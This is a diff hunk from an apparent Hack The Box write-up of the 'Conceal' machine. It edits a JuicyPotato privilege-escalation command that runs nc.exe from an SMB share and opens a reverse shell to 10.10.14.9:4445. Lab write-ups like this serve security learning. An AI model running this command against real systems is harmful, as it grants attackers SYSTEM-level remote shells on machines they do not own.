@@ -557,7 +557,7 @@ Googling I found a [post](https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterpri
 I start testing with wuauserv which probably be enabled 
 
 ```bash
-.\JuicyPotato.exe -t * -p \Windows\System32\cmd.exe -l 1338 -a "/c \\10.10.14.9\smbFolder\nc.exe -e cmd 10.10.14.9 4445" -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
+.\JuicyPotato.exe -t * -p \Windows\System32\cmd.exe -l 1338 -a "/c \\10.10.14.9\smbFolder\nc.exe -e cmd 10.10.14.9 4445" -c '{e60687f7-01a1-40aa-86ac-db1cbf673334}'
 ```
 
 ![Untitled](/HTB/conceal-9.png)
